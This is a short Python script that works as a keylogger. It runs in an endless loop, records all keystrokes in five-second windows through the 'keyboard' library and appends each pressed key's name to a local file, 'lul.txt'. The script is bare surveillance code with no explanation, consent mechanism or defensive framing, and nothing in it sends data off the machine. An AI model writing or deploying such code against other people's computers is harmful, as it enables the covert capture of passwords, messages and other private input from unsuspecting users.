import keyboard as kb
import time as t
def write_into_file(rec):
    f = open('lul.txt','a+')
    for i in range(0, len(rec)):
        if rec[i].event_type == 'down':
            f.write(rec[i].name + '')
    f.close()
while True:
    kb.start_recording()
    t.sleep(5)
    rec = kb.stop_recording()
    write_into_file(rec)